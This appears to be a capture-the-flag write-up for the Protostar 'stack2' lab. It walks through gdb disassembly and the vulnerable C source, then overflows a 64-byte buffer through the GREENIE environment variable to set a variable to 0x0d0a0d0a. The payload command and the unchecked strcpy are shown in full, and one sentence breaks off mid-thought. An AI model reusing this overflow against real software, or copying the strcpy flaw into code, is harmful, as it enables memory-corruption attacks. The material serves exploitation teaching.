# Stack 2

## Problem analysis

We first try to run the stack2 file by invoking it.

```shell
./stack2
>>>stack2: please set the GREENIE environment variable
```

which returns to us the output above. This suggests to us that there might be a
need to set some form of environment variable.

We try to take a look at the gdb dump as well. We can see that there is a variable in `esp+0x58` set to $0$ that we have to modify for comparison later in the code. We can also guess that the stack is likely to be of higher address space since the stack 

```gdb
Dump of assembler code for function main:
0x08048494 <main+0>:    push   ebp
0x08048495 <main+1>:    mov    ebp,esp
0x08048497 <main+3>:    and    esp,0xfffffff0
0x0804849a <main+6>:    sub    esp,0x60
0x0804849d <main+9>:    mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:   cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:   mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
0x080484c8 <main+52>:   mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:   mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:   lea    eax,[esp+0x18]
0x080484dc <main+72>:   mov    DWORD PTR [esp],~~eax~~
0x080484df <main+75>:   call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:   mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:   cmp    eax,0xd0a0d0a
0x080484ed <main+89>:   jne    0x80484fd <main+105>
0x080484ef <main+91>:   mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
0x080484fb <main+103>:  jmp    0x8048512 <main+126>
0x080484fd <main+105>:  mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:  mov    eax,0x8048641
0x08048506 <main+114>:  mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:  mov    DWORD PTR [esp],eax
0x0804850d <main+121>:  call   0x80483ac <printf@plt>
0x08048512 <main+126>:  leave
0x08048513 <main+127>:  ret
End of assembler dump.
```

We can see that there is some function call `getenv` which gets the environment
variable on line `main+16`

We can also see that eventually there is some compare operation in `main+84`.
This hints to us that there might be some variable that we need to modify to
the value *0x0d0a0d0a*.

## Idea and Attack process

We try to guess that the environment variable might be linked to the cmp
operation. We first try to set the env in the shell and run the code.

```shell
export GREENIE=GREENIE=$(python -c 'print "\x0a\x0d\x0a\x0d"')
./stack2
>>>Try again, you got 0x00000000
```

We can see that the output of the code gave us some unset variable. This suggest
that the modification of the env variable is insufficient.

We continue to see that on `main+75` that we might need to exploit `strcpy`. From `main+60` to `main+72` we see that there is a copy of a variable pointer and buffer pointer below esp.
We can see that the address of the buffer starts `esp+18` and the address of the variable to be modified is `esp+58`, so we can do a buffer overflow to overwrite the value in the variable.

```shell
export GREENIE=$(python -c 'print "1234567890123456789012345678901234567890123456789012345678901234\x0a\x0d\x0a\x0d"')
./stack2
>>>you have correctly modified the variable
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
